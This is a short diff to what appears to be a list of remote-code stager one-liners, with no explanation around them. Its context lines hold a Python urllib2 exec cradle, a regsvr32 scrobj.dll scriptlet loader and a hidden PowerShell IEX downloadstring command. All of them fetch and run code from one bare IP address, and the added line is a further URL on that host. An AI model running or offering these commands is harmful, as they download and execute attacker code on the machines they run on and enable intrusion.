@@ -7,3 +7,5 @@ python -c "import urllib2; exec urllib2.urlopen('http://99.79.124.60:80/a').read
 regsvr32 /s /n /u /i:http://99.79.124.60:80/a scrobj.dll
 
 powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://99.79.124.60:80/a'))"
+
+http://99.79.124.60:80/mPlayer
